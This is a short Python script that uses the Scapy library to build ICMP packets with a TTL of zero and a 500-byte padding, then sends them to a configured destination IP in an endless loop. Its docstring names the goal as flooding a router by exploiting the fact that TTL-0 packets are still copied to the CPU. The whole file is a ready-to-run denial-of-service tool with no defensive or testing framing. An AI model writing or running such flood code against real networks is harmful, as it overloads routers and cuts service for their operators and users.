#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, ICMP
import settings
"""
Sending a lot of tll0 pings to flooding router. ttl0 packet are still copied to CPU !
"""


pck = Ether()/IP(dst=settings.destination_ip, ttl=0)/ICMP()/Raw(b"X" * 500)
pck.show()
sendp(pck, iface=settings.source_interface, loop=1)